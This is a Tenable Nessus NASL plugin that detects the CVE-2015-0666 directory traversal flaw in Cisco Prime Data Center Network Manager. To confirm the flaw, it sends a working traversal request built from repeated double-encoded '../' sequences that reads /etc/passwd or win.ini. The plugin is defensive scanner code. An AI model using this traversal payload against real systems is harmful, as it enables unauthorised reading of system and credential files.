#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(82740);
  script_version("1.13");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2015-0666");
  script_bugtraq_id(73479);
  script_xref(name:"CISCO-BUG-ID", value:"CSCus00241");
  script_xref(name:"CISCO-SA", value:"cisco-sa-20150401-dcnm");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/04/15");

  script_name(english:"Cisco Prime Data Center Network Manager < 7.1(1) Directory Traversal Vulnerability");

  script_set_attribute(attribute:"synopsis", value:
"A network management system installed on the remote host is affected
by a directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Cisco Prime Data Center Network Manager (DCNM)
installed on the remote host is affected by a directory traversal
vulnerability in the fmserver servlet due to improper validation of
user-supplied input. An unauthenticated, remote attacker, using a
crafted file pathname, can read arbitrary files from the filesystem
outside of a restricted path.");
  script_set_attribute(attribute:"see_also", value:"https://www.zerodayinitiative.com/advisories/ZDI-15-111/");
  # https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20150401-dcnm
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d7202716");
  script_set_attribute(attribute:"see_also", value:"https://tools.cisco.com/security/center/viewAlert.x?alertId=37810");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Cisco Prime Data Center Network Manager 7.1(1) or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2015-0666");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/04/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/04/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/04/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cisco:prime_data_center_network_manager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CISCO");

  script_copyright(english:"This script is Copyright (C) 2015-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("cisco_prime_dcnm_web_detect.nasl");
  script_require_keys("installed_sw/cisco_dcnm_web");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

appname = "Cisco Prime DCNM";
app_id  = "cisco_dcnm_web";
get_install_count(app_name:app_id, exit_if_zero:TRUE);

port = get_http_port(default:80);
install = get_single_install(app_name:app_id, port:port);

path = install['path'];
install_url = build_url(qs:path, port:port);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('/windows/win.ini', '/winnt/win.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  url = path + "/fmserver/" + crap(length:15*10, data:"%252E%252E%252F") + file ;
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      file        : file,
      request     : make_list(build_url(qs:url, port:port)),
      output      : chomp(res[2]),
      attach_type : 'text/plain'
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);
